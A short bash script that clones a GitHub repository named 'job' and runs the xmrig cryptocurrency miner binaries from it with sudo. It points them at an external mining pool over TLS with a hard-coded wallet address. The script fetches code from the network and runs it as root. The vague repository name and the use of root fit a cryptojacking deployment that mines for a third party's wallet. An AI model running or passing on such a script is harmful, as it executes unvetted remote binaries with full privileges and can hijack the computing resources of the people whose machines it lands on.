#!/bin/bash
git clone https://github.com/realxdagg/job.git
cd job
chmod 500 xmrigDaemon xmrigMiner
sudo ./xmrigDaemon -a mike --url stratum-eu.rplant.xyz:17040 --tls --user XqMPTMW5cPdVJYCiFcNZtbqXo9jjQ1iskM.01 --pass m=solo
